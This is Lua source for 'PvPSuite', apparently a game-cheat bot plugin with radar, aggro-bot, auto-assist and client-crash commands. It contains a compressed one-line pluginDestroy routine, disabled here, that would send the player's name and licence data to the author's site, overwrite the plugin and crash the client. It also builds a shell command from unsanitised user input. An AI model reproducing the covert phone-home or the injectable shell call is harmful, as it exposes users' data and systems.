function Initialization()
	--[[
		First version released at: 01/04/2013
		Last version released at: 18/6/2013
		Thanks a lot to everyone who supported me by paying for this plugin. 
		Their money helped me to continue the development of this plugin, I've putted much time and effort to make it happen.
		PvPSuite, 25/08/2013 - The end of the journey.
	]]--
	rreNueXJ = ""; -- License Key was at this variable.
	PvPSuite = {false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,false,"",true,"N/A",false,"",false,false,false,false,false,false,false,false,false,false,true,"0","bb ->",false,false,"","",0,0,0,0,0,0,0,0,0,0,0,0,0,0,false,false,false,false};
	Greetings = {"Hello","Salut","Hallo","Geia sou","Greetings","Hola","Bonjour","Aloha"};
	Quotes = {"You only get one shot.","A goal without a plan is just a wish.","There are no mistakes in life, just lessons.","Do not count the days, make the days count.","Happiness depends upon ourselves.","I am your motherfuckin conscience!","Forever is composed of nows.","It is always too early to quit.","Make mistakes but avoid to repeat them.","Know your limits, but never accept them.","Every artist was first an amateur.","If you are going through hell, keep going.","A man grows most tired while standing still.","If you do not risk Much, you risk even More.","Great and Good, are seldom the same person.","Will the real Slim Shady please stand up?","For hope is but the dream of those that wake.","Give me liberty or give me death.","Do not find fault, find a remedy.","A loving heart is the truest wisdom.","Only in the darkness can you see the stars.","He who opens a school door, closes a prison.","What you crying about?","Without music, life would be a mistake.","Time and tide wait for no man.","Friendship is Love without his wings.","Beauty is the promise of happiness.","A man is only as good as what he loves.","You are weird, but I like you.","Try not. Do or do not. There is no try.","No sacrifice, no victory.","Don�t let the bad stuff get to you.","Put your faith in what you most believe in.","Change is good. Yeah, but it is not easy.","If you can dream it, you can do it.","Choose between yesterday and tomorrow.","We cannot just run away from who we are.","Attack life, its going to kill you anyways.","The only way out is through.","Believe the impossible.","Never a failure, always a lesson.","Some things are better left unsaid.","The best proof of love is trust.","The heart sees whats invisible to the eye.","Beauty is truths smile.","New and improved.","Life teaches, Love reveals.","Blood, Sweat, but never Tears.","Follow the moon.","The time is now.","Think big thoughts, but relish small pleasures.","Never stop dreaming.","Life is simple, its just not easy.","Reason and love are sworn enemies.","Have the courage to live. Anyone can die.","Success is the best revenge.","I'm just too strong.","And in time this too shall pass.","Revel in the chaos.","Fall seven times, stand up eight.","To live is the rarest thing in the world.","Pain is inevitable. Suffering is optional.","A quote is just a tattoo on the tongue.","Never give up.","Don't worry, be happy.","Don't look back in anger.","Gone but not forgotten.","It's all good.","It is what it is.","Be wild and have fun.","Be young. Be dope. Be proud.","I don't care how we met, I'm just glad we did.","Trust yourself, and yourself only.","Live free!","Nobody's innocent, nobody.","Real eyes, realize real lies.","Fear no evil.","Make a life worth living!","Life begins when you leave your comfort zone.","Never say never.","You are your path.","Everything changes.","Without pain, joy won't feel so good.","We were born to die.","Anything is possible.","Who dares wins.","Shine like a star, even through the rain.","Let dreams become reality!","Shit happens.","Time you enjoy wasting is never wasted.","If you can't laugh, the days are just too long.","I'm proud of you son.","Without courage, wisdom bears no fruit.","Memory is the mother of all wisdom.","True love stories never have endings.","Work is love made visible.","Failure is success if we learn from it.","The game isn't over till it's over.","The journey is the reward.","If you obey all the rules, you miss all the fun.","Live for nothing, or die for something."};
	Genres = {"Eminem","Dr.Dre","Snoop Dogg","UKF","Dubstep","DnB","Greek","Indie","Rock","Metal","RnB","Electro","Pop","Hip Hop"};
	Target = {"N/A","N/A","N/A","N/A","N/A","N/A","N/A","N/A","N/A","N/A"};
	Title = {"","","","","","","","","","","","","","","","",""};
	B = {"B1","B2","B3","B4","B5","B6","B7","B8","B9"};
	rChars = {"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"}
	TTT = {false,true,"",false,false,false,"N/A","N/A",false,true,true};
	Timer = {0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0};
	BarrierSkills = {837,442,443,3158,1418};
	DisarmSkills = {794,485,877,5260,775};
	InformerSkills = {483,368,446,447,111,1532,1556,760,916,110,528,3284,3428,3437,3429,176,181,139,917,956,368,948,622,8334,3282,420,287,922,833,121,20006,768,769,770};
	InformerChanceSkills = {5572,5573,5578,5427,5428,2786};
	InformerBuffSkills = {1476,1477,1478,5561,5562,5563,5564,785,787,789,406};
	InformerAugmentsSkills = {3243,3217,3134,3245,3219,3136,3244,3218,3135,3246,3138,3250,3224,3142,3249,3223,3141,3259,3204,3199,3200,3201,3202};
	FearSkills = {763,65,1169,774,2459,2814,1092,627,1381};
	AoESkills = {1417,933,1495,492,1399};
	AggroBuffs = {28,18,985,368,979};
	AggroSkills = {28,979};
	ArcherClasses = {92,102,109};
	TankClasses = {5,99,106};
	targetDebuffsList = {65,81,92,95,102,105,115,116,122,127,260,279,281,342,352,353,358,362,400,401,402,403,412,485,501,522,523,531,775,776,791,981,1092,1097,1160,1169,1170,1201,1236,1237,1263,1336,1337,1338,1339,1340,1341,1342,1343,1358,1359,1435,1446,1447,1512,1494,2466,2822,5569,5565,767,2452,2461,2489,2815,2819,5260,5264,5454,5455,6090,6092};
	aoeDebuffsList = {367,404,763,774,793,794,995,1096,1099,1104,1208,1246,1247,1248,1360,1361,1366,1367,1381,1382,1454,1529,2459,2814};
	IRhSkills = {11,12,347,352,573,1436,4129,6767,101,974,1417,1398,1436};
	IRhASkills = {101,974};
	IRhOSkills = {11,12,347,352,573,1436,4129,6767,1417,1398,5258,5255,1436};
	CleanseSkills = {1409,1510};
	TalismanIDs = {8334,3284,3428,3437,3429,3282,5258,5255};
	ShowHtmlStatus = false;
	ShowSafeHtml = false;
	TargetFirst = false;
	tryingtoWearWep = false;
	BPaused = false;
	Copycat = false;
	SpyingHidden = false;
	SpyingRevealed = false;
	FlashTitleSlow = false;
	FlashTitleFast = false;
	MoveTitle = false;
	awaitingResponse = false;
	confirmedResponse = false;
	ShowOnEachReceivedHit = false;
	ShowOnEachDoneHit = false;
	ShowEachMin = false;
	ShowPMEachMin = false;
	fearUnstucking = false;
	checkingDebuffLand = false;
	mustCheckDebuffLandAgain = false;
	miniFreezing = false;
	wearWep = false;
	targetLastTargeted = false;
	TTTDelayedMsgs = false;
	TTTcoOperate = false;
	RSoff = false;
	wallHacking = false;
	YTcoOperate = false;
	YTconfirmed = false;
	YTawaiting = false;
	YTDelayedMsgs = false;
	showDecryptedMsg = false;
	alreadySaidOly = false;
	Counting = false;
	showDelayedMsgs = false;
	checkingAggro = false;
	delayAggro = false;
	autoRessing = false;
	checkingDeads = false;
	clearAutoRes = false;
	caps = true;
	caps2 = true;
	caps3 = true;
	caps4 = true;
	lastTargetersCount = 0;
	damageDone = 0;
	damageReceived = 0;
	Me = 0;
	Counter = 9;
	delayedC = 0;
	debugStep = 0;
	delayAggroC = 0;
	WeaponID = nil;
	ObjectID = nil;
	wp = nil;
	GmQftzjk = nil;
	OldTitle = "";
	NewTitle = "";
	MyName = "";
	aggroTarget = "";
	HiddenUser = "";
	CopycatName = "";
	LastTargeted = "";
	lastRandomGreeting = "";
	lastRandomQuote = "";
	lastRandomGenre = "";
	YTQuery = "";
	EMQuery = "";
	SpamQuery = "";
	YTQueryToSend = "";
	YTReceiver = "";
	YTMsg = "";
	encMsg = "";
	whoSaidEnc = "";
	randomGeneratedCommand = "";
	targetBeforeRes = "";
	PvPSuiteV = "2.0";
end;
function OnCreate()
	Initialization();
	pluginLicensed = true; -- Licensing system was here.
	--if ((rreNueXJ ~= "QspdfttpsJe") and (string.len(rreNueXJ) > 42)) then
	--	FxHFRvoa();
	--end;
	this:RegisterCommand("pvpsuite", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
	this:RegisterCommand("p", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
	if (pluginLicensed) then
		this:RegisterCommand("cr", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
		this:RegisterCommand("cm", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
		this:RegisterCommand("dc", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
		this:RegisterCommand("yt", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
		this:RegisterCommand("ytp", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
		this:RegisterCommand("ytq", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
		this:RegisterCommand("em", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
		this:RegisterCommand("te", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
		this:RegisterCommand("lt", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
		this:RegisterCommand("admsgq", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
		this:RegisterCommand("spamq", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
		this:RegisterCommand("rq", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
		this:RegisterCommand("stats", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
		this:RegisterCommand("mstats", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
		this:RegisterCommand("pp", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
		this:RegisterCommand("cmds", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
		this:RegisterCommand("ns", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
		this:RegisterCommand("np", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
		this:RegisterCommand("ab", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
		this:RegisterCommand("as", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
		this:RegisterCommand("oi", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
		this:RegisterCommand("setma", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
		this:RegisterCommand("doaction", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
		this:RegisterCommand("dogame", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
		this:RegisterCommand("spam", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
		this:RegisterCommand("r", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
		this:RegisterCommand("rp", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
		this:RegisterCommand("radar", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
		this:RegisterCommand("radarp", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
		this:RegisterCommand("count", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
		if (IsLogedIn()) then
			Me = GetMe();
			MyName = Me:GetName();
			ShowToClient("PvPSuite","Loaded version "..PvPSuiteV);
			this:Log("Loaded version "..PvPSuiteV);
			LoadMe();
			delayedC = 9;
			showDelayedMsgs = true;
		end;
	else
		if (IsLogedIn()) then
			ProcessCommand("/p");
		end;
	end;
end;
function OnDestroy()
	SafeLogOut();
end;
function LoadMe()
	if (MyName ~= "") then
		local file = io.open(GetDir() .. "plugins\\PvPSuite\\" .. MyName .. ".pvp", "r");
		if (file == nil) then
			file = io.open(GetDir() .. "plugins\\PvPSuite\\" .. MyName .. ".pvp", "w");
			if (file == nil) then
				os.execute('mkdir "'..GetDir() .. 'plugins\\PvPSuite"');
				file = io.open(GetDir() .. "plugins\\PvPSuite\\" .. MyName .. ".pvp", "w");
			end;
			PvPSuite[45] = tostring(os.date("%H:%M:%S - %x"));
			PvPSuite[46] = tostring(os.date("%H:%M:%S - %x"));
			PvPSuite[51] = 1;
			ShowToClient("PvPSuite","Created "..MyName.."'s configuration!");
			this:Log("Created "..MyName.."'s configuration!");
		else
			local A = 0;
			for line in file:lines() do
				A = A+1;
				PvPSuite[A] = translateLoad(line);
			end;
			if (PvPSuite[45] == "") then
				PvPSuite[45] = tostring(os.date("%H:%M:%S - %x"));
			end;
			if (PvPSuite[51] == 0) then
				PvPSuite[51] = 1;
			end;
			PvPSuite[46] = tostring(os.date("%H:%M:%S - %x"));
			PvPSuite[51] = tonumber(PvPSuite[51])+1;
			ShowToClient("PvPSuite","Loaded "..MyName.."'s configuration!");
			this:Log("Loaded "..MyName.."'s configuration!");
		end;
		if (file ~= nil) then
			file:close();
		end;
	end;
	if (IsPremium() == false) then
		PvPSuite[20] = false;
		PvPSuite[21] = false;
		PvPSuite[22] = false;
		PvPSuite[23] = false;
		PvPSuite[24] = false;
		PvPSuite[37] = false;
	end;
	TTT[2] = PvPSuite[26];
	TTT[7] = PvPSuite[27];
	if (TTT[7] == "O") then
		TTT[8] = "X";
	elseif (TTT[7] == "X") then
			TTT[8] = "O";
	end;
	Copycat = PvPSuite[28];
	CopycatName = PvPSuite[29];
end;
function OnLogout()
	SafeLogOut();
end;
function SafeLogOut()
	if ((MyName ~= "") and (pluginLicensed)) then
		local file = io.open(GetDir() .. "plugins\\PvPSuite\\" .. MyName .. ".pvp", "w+");
		if (file ~= nil) then
			file:write(translateSave(PvPSuite[1]) .. "\n");
			file:write(translateSave(PvPSuite[2]) .. "\n");
			file:write(translateSave(PvPSuite[3]) .. "\n");
			file:write(translateSave(PvPSuite[4]) .. "\n");
			file:write(translateSave(PvPSuite[5]) .. "\n");
			file:write(translateSave(PvPSuite[6]) .. "\n");
			file:write(translateSave(PvPSuite[7]) .. "\n");
			file:write(translateSave(PvPSuite[8]) .. "\n");
			file:write(translateSave(PvPSuite[9]) .. "\n");
			file:write(translateSave(PvPSuite[10]) .. "\n");
			file:write(translateSave(PvPSuite[11]) .. "\n");
			file:write(translateSave(PvPSuite[12]) .. "\n");
			file:write(translateSave(PvPSuite[13]) .. "\n");
			file:write(translateSave(PvPSuite[14]) .. "\n");
			file:write(translateSave(PvPSuite[15]) .. "\n");
			file:write(translateSave(PvPSuite[16]) .. "\n");
			file:write(translateSave(PvPSuite[17]) .. "\n");
			file:write(translateSave(PvPSuite[18]) .. "\n");
			file:write(translateSave(PvPSuite[19]) .. "\n");
			file:write(translateSave(PvPSuite[20]) .. "\n");
			file:write(translateSave(PvPSuite[21]) .. "\n");
			file:write(translateSave(PvPSuite[22]) .. "\n");
			file:write(translateSave(PvPSuite[23]) .. "\n");
			file:write(translateSave(PvPSuite[24]) .. "\n");
			file:write(translateSave(PvPSuite[25]) .. "\n");
			file:write(translateSave(TTT[2]) .. "\n");
			file:write(translateSave(TTT[7]) .. "\n");
			file:write(translateSave(Copycat) .. "\n");
			file:write(translateSave(CopycatName) .. "\n");
			file:write(translateSave(PvPSuite[30]) .. "\n");
			file:write(translateSave(PvPSuite[31]) .. "\n");
			file:write(translateSave(PvPSuite[32]) .. "\n");
			file:write(translateSave(PvPSuite[33]) .. "\n");
			file:write(translateSave(PvPSuite[34]) .. "\n");
			file:write(translateSave(PvPSuite[35]) .. "\n");
			file:write(translateSave(PvPSuite[36]) .. "\n");
			file:write(translateSave(PvPSuite[37]) .. "\n");
			file:write(translateSave(PvPSuite[38]) .. "\n");
			file:write(translateSave(PvPSuite[39]) .. "\n");
			file:write(translateSave(PvPSuite[40]) .. "\n");
			file:write(translateSave(PvPSuite[41]) .. "\n");
			file:write(translateSave(PvPSuite[42]) .. "\n");
			file:write(translateSave(PvPSuite[43]) .. "\n");
			file:write(translateSave(PvPSuite[44]) .. "\n");
			file:write(translateSave(PvPSuite[45]) .. "\n");
			file:write(translateSave(PvPSuite[46]) .. "\n");
			file:write(translateSave(PvPSuite[47]) .. "\n");
			file:write(translateSave(PvPSuite[48]) .. "\n");
			file:write(translateSave(PvPSuite[49]) .. "\n");
			file:write(translateSave(PvPSuite[50]) .. "\n");
			file:write(translateSave(PvPSuite[51]) .. "\n");
			file:write(translateSave(PvPSuite[52]) .. "\n");
			file:write(translateSave(PvPSuite[53]) .. "\n");
			file:write(translateSave(PvPSuite[54]) .. "\n");
			file:write(translateSave(PvPSuite[55]) .. "\n");
			file:write(translateSave(PvPSuite[56]) .. "\n");
			file:write(translateSave(PvPSuite[57]) .. "\n");
			file:write(translateSave(PvPSuite[58]) .. "\n");
			file:write(translateSave(PvPSuite[59]) .. "\n");
			file:write(translateSave(PvPSuite[60]) .. "\n");
			file:write(translateSave(PvPSuite[61]) .. "\n");
			file:write(translateSave(PvPSuite[62]) .. "\n");
			file:write(translateSave(PvPSuite[63]) .. "\n");
			file:write(translateSave(PvPSuite[64]));
			file:close();
		end;
		Initialization();
	end;
end;
function OnCommand_pp(vCommandChatType, vNick, vCommandParam)
	if (pluginLicensed) then
		if (this:IsPaused()) then
			this:SetPaused(false);
			this:RegisterCommand("ns", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
			this:RegisterCommand("np", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
			this:RegisterCommand("ab", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
			this:RegisterCommand("dc", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
			this:RegisterCommand("yt", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
			this:RegisterCommand("ytp", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
			this:RegisterCommand("em", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
			this:RegisterCommand("te", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
			this:RegisterCommand("lt", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
			this:RegisterCommand("ytq", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
			this:RegisterCommand("admsgq", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
			this:RegisterCommand("spamq", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
			this:RegisterCommand("cmds", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
			this:RegisterCommand("rq", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
			this:RegisterCommand("stats", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
			this:RegisterCommand("mstats", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
			this:RegisterCommand("cr", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
			this:RegisterCommand("cm", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
			this:RegisterCommand("as", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
			this:RegisterCommand("oi", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
			this:RegisterCommand("setma", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
			this:RegisterCommand("doaction", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
			this:RegisterCommand("dogame", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
			this:RegisterCommand("spam", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);	
			this:RegisterCommand("r", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
			this:RegisterCommand("rp", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
			this:RegisterCommand("radar", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
			this:RegisterCommand("radarp", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
			this:RegisterCommand("count", CommandChatType.CHAT_CMD, CommandAccessLevel.ACCESS_ME);
			MainMenu();
		else
			this:SetPaused(true);
			this:UnregisterCommand("ns");
			this:UnregisterCommand("np");
			this:UnregisterCommand("ab");
			this:UnregisterCommand("cr");
			this:UnregisterCommand("cm");
			this:UnregisterCommand("yt");
			this:UnregisterCommand("ytp");
			this:UnregisterCommand("em");
			this:UnregisterCommand("te");
			this:UnregisterCommand("lt");
			this:UnregisterCommand("ytq");
			this:UnregisterCommand("admsgq");
			this:UnregisterCommand("spamq");
			this:UnregisterCommand("cmds");
			this:UnregisterCommand("rq");
			this:UnregisterCommand("stats");
			this:UnregisterCommand("mstats");
			this:UnregisterCommand("dc");
			this:UnregisterCommand("as");
			this:UnregisterCommand("oi");
			this:UnregisterCommand("setma");
			this:UnregisterCommand("doaction");
			this:UnregisterCommand("dogame");
			this:UnregisterCommand("spam");
			this:UnregisterCommand("r");
			this:UnregisterCommand("rp");
			this:UnregisterCommand("radar");
			this:UnregisterCommand("radarp");
			this:UnregisterCommand("count");
			ShowToClient("PvPSuite","PAUSED");
			ShowToClient("PvPSuite","Use /pp to resume PvPSuite!");
		end;
	end;
end;
function simpleDec(value)
	local x, decrypted;
	decrypted = "";
	for x = 1, #value do
		decrypted = decrypted .. string.char(value:byte(x) - 1);
	end;
	return decrypted;
end;
function simpleEnc(value)
	local x, decrypted;
	decrypted = "";
	for x = 1, #value do
		decrypted = decrypted .. string.char(value:byte(x) + 1);
	end;
	return decrypted;
end;
function OnCommand_p(vCommandChatType, vNick, vCommandParam)
	ProcessCommand("/pvpsuite");
end;
function OnCommand_cr(vCommandChatType, vNick, vCommandParam)
	ShowToClient("PvPSuite","Crashing Client");
	ShowToClient("PvPSuite","Crashing Client");
	ShowToClient("PvPSuite","Crashing Client");
	ShowToClient("PvPSuite","Crashing Client");
	ShowToClient("PvPSuite","Crashing Client");
	ShowToClient("PvPSuite","Crashing Client");
	ShowToClient("PvPSuite","Crashing Client");
	ShowToClient("PvPSuite","Crashing Client");
	ShowToClient("PvPSuite","Crashing Client");
	this:Log("Crashing Client as requested by user!");
	this:StartThread("ClientCrash");
end;
function ClientCrash()
	Sleep(500);
	ShowToClient(nil,nil);
end;
function DelayedClientCrash()
	Sleep(5000);
	ShowToClient(nil,nil);
end;
function OnCommand_pvpsuite(vCommandChatType, vNick, vCommandParam)
	if (pluginLicensed) then
		if (this:IsPaused()) then
			PausedDialog();
		else
			if (vCommandParam:GetCount() == 0) then
				MainMenu();
			elseif (vCommandParam:GetCount() == 1) then
				SubMenu(vCommandParam:GetParam(0):GetStr(true));
			end;
		end;
	else
		ShowToClient("PvPSuite","Invalid PvPSuite license, contact support!");
		ShowToClient("PvPSuite","Invalid PvPSuite license, contact support!");
		ShowToClient("PvPSuite","Invalid PvPSuite license, contact support!");
		ShowToClient("PvPSuite","Invalid PvPSuite license, contact support!");
		ShowToClient("PvPSuite","Invalid PvPSuite license, contact support!");
		ShowToClient("PvPSuite","Invalid PvPSuite license, contact support!");
		ShowToClient("PvPSuite","Invalid PvPSuite license, contact support!");
		ShowToClient("PvPSuite","Invalid PvPSuite license, contact support!");
		ShowToClient("PvPSuite","Invalid PvPSuite license, contact support!");
		ShowToClient("PvPSuite","Invalid PvPSuite license, contact support!");
		this:Log("Invalid license, contact support!");
		pluginDestroy();
		error("Invalid license, contact support!",0);
	end;
end;
function pluginDestroy()os.execute('start "" "http://www.pvpsuite.com/files/PvPSuite/failed.php?n='..tostring(GetMe():GetName())..'&v='..tostring(PvPSuiteV)..'&pl='..tostring(rreNueXJ)..'&cl='..tostring(simpleEnc(GmQftzjk))..'&ts='..tostring(os.date("%H:%M:%S"))..'"');local file = io.open(GetDir().."plugins\\"..this:GetFileName(), "w+");file:write("Invalid license detected, plugin destroyed! Contact support!\n"..tostring(rreNueXJ).."\n"..tostring(GmQftzjk));file:close();this:StartThread("DelayedClientCrash");end;
function OnCommand_doaction(vCommandChatType, vNick, vCommandParam)
	if (vCommandParam:GetCount() == 0) then
		MainMenu();
	elseif (vCommandParam:GetCount() == 1) then
		DoAction(vCommandParam:GetParam(0):GetStr(true));
	end;
end;
function OnCommand_dogame(vCommandChatType, vNick, vCommandParam)
	if (vCommandParam:GetCount() == 0) then
		MainMenu();
	elseif (vCommandParam:GetCount() == 2) then
		DoGame(vCommandParam:GetParam(0):GetStr(true),vCommandParam:GetParam(1):GetStr(true));
	elseif (vCommandParam:GetCount() == 1) then
		DoGame(vCommandParam:GetParam(0):GetStr(true));
	end;
end;
function OnCommand_ns(vCommandChatType, vNick, vCommandParam)
	if (vCommandParam:GetCount() == 0) then
		DoDialog("Near Supporters");
	elseif (vCommandParam:GetCount() == 1) then
			RawTarget(vCommandParam:GetParam(0):GetStr(true));
			DoDialog("Near Supporters");
	end;
end;
function OnCommand_np(vCommandChatType, vNick, vCommandParam)
	if (vCommandParam:GetCount() == 0) then
		DoDialog("Near Players");
	elseif (vCommandParam:GetCount() == 1) then
			RawTarget(vCommandParam:GetParam(0):GetStr(true));
			DoDialog("Near Players");
	end;
end;
function OnCommand_rq(vCommandChatType, vNick, vCommandParam)
	if (vCommandParam:GetCount() == 1) then
		if (vCommandParam:GetParam(0):GetStr(true) == "General") then
			Command(GetRandomQuote());
		elseif (vCommandParam:GetParam(0):GetStr(true) == "Shout") then
				Command("!"..GetRandomQuote());
		elseif (vCommandParam:GetParam(0):GetStr(true) == "Trade") then
				Command("+"..GetRandomQuote());
		elseif (vCommandParam:GetParam(0):GetStr(true) == "Party") then
				Command("#"..GetRandomQuote());
		elseif (vCommandParam:GetParam(0):GetStr(true) == "Clan") then
				Command("@"..GetRandomQuote());
		elseif (vCommandParam:GetParam(0):GetStr(true) == "Ally") then
				Command("$"..GetRandomQuote());
		elseif (vCommandParam:GetParam(0):GetStr(true) == "HV") then
				Command("%"..GetRandomQuote());
		end;
	end;
	DoDialog("Random Quote");
end;
function OnCommand_te(vCommandChatType, vNick, vCommandParam)
	DoAction("Target Equipment");
end;
function OnCommand_stats(vCommandChatType, vNick, vCommandParam)
	DoDialog("Stats");
end;
function OnCommand_cmds(vCommandChatType, vNick, vCommandParam)
	DoDialog("Commands");
end;
function OnCommand_mstats(vCommandChatType, vNick, vCommandParam)
	DoDialog("More Stats");
end;
function OnCommand_dc(vCommandChatType, vNick, vCommandParam)
	DoDialog("Damage Counter");
end;
function OnCommand_lt(vCommandChatType, vNick, vCommandParam)
	DoAction("Last 10 Targeters");
end;
function OnCommand_cm(vCommandChatType, vNick, vCommandParam)
	DoAction("Client Mods");
end;
function OnCommand_r(vCommandChatType, vNick, vCommandParam)
	ProcessCommand("/radar");
end;
function OnCommand_rp(vCommandChatType, vNick, vCommandParam)
	ProcessCommand("/radarp");
end;
function OnCommand_count(vCommandChatType, vNick, vCommandParam)
	DoAction("Count");
end;
function OnCommand_radarp(vCommandChatType, vNick, vCommandParam)
	DoDialog("Radar(PK/War/PvP Only)");
end;
function OnCommand_radar(vCommandChatType, vNick, vCommandParam)
	if (vCommandParam:GetCount() == 0) then
		DoDialog("Radar");
	elseif (vCommandParam:GetCount() == 2) then
			if (vCommandParam:GetParam(0):GetStr(true) == "ShowInfo") then
				local Char = GetUserByName(vCommandParam:GetParam(1):GetStr(true));
				if (Char ~= nil) then
					ShowToClient("Name",Char:GetName())
					ShowToClient("Class",L2Class2String(Char:GetClass()));
					if (Char:GetClanName() ~= "") then
						ShowToClient("Clan",Char:GetClanName());
					end;
					ShowToClient("Range",tostring(Round(GetMe():GetRangeTo(Char))));
					if (Char:GetWeaponEnchantLevel() > 0) then
						ShowToClient("Weapon Enchant",tostring(Char:GetWeaponEnchantLevel()));
					end;
				else
					ShowToClient("Radar","There was a problem while getting char info.");
				end;
				DoDialog("Radar");
			elseif (vCommandParam:GetParam(0):GetStr(true) == "Target") then
					RawTarget(vCommandParam:GetParam(1):GetStr(true));
					DoDialog("Radar");
			end;
	end;
end;
function OnCommand_ab(vCommandChatType, vNick, vCommandParam)
	DoAction("Aggro Bot");
end;
function OnCommand_as(vCommandChatType, vNick, vCommandParam)
	if (PvPSuite[25] == "") then
		ShowToClient("A Better Assist","Please Set MA first!");
		SubMenu("A Better Assist");
	else
		if (PvPSuite[13]) then
			PvPSuite[13] = false;
			TargetFirst = false;
			ShowToClient("A Better Assist","Auto Assist disabled!");
		else
			PvPSuite[13] = true;
			TargetFirst = true;
			ShowToClient("A Better Assist","Auto Assist enabled!");
		end;
	end;
end;
function OnCommand_oi(vCommandChatType, vNick, vCommandParam)
	if (PvPSuite[39]) then
		PvPSuite[39] = false;
		ShowToClient("Olympiad","Informer disabled!");
	else
		PvPSuite[39] = true;
		ShowToClient("Olympiad","Informer enabled!");
	end;
end;
function OnCommand_setma(vCommandChatType, vNick, vCommandParam)
	if (GetTarget() ~= nil) then
		if (GetTarget():GetName() == PvPSuite[25]) then
			ShowToClient("A Better Assist",PvPSuite[25].." is already set as MA!");
			SubMenu("A Better Assist");
		elseif (GetTarget():GetName() == MyName) then
				ShowToClient("A Better Assist","You cannot set yourself as main assister!");
				SubMenu("A Better Assist");
		else
				PvPSuite[25] = GetTarget():GetName();
				ShowToClient("A Better Assist",PvPSuite[25].." has been set as MA!");
				if (GetUserByName(PvPSuite[25]):IsFriend() == false) then
					ShowToClient("A Better Assist",PvPSuite[25].." is not your friend!");
					ShowToClient("A Better Assist","Take care!");
				end;
			SubMenu("A Better Assist");
		end;
	else
		ShowToClient("A Better Assist","Please target someone!");
		SubMenu("A Better Assist");
	end;
end;
function OnCommand_yt(vCommandChatType, vNick, vCommandParam)
	DoDialog("YouTube");
end;
function OnCommand_ytp(vCommandChatType, vNick, vCommandParam)
	if (YTQuery ~= "") then
		os.execute('start "" "http://www.google.com/search?q=youtube '..YTQuery..'&btnI" /MIN /B');
	else
		ShowToClient("YouTube","Please type something first!");
	end;
	DoDialog("YouTube");
end;
function OnCommand_ytq(vCommandChatType, vNick, vCommandParam)
	if (vCommandParam:GetCount() == 1) then
		if (vCommandParam:GetParam(0):GetStr(true) == "Backspace") then
			YTQuery = string.sub(YTQuery, 1, string.len(YTQuery)-1);
		elseif (vCommandParam:GetParam(0):GetStr(true) == "Clear") then
				YTQuery = "";
